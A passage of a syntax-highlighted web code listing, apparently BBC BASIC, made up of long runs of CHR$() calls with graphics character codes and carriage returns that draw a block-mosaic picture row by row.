class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">190</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">189</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">139</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">189</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">188</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">135</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">184</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">180</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">175</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">180</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">184</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">159</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">184</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">188</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">188</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">170</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">151</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">175</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">159</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">149</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">170</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">149</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">170</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">149</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">186</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">135</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">139</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">189</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">171</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">180</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">144</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token 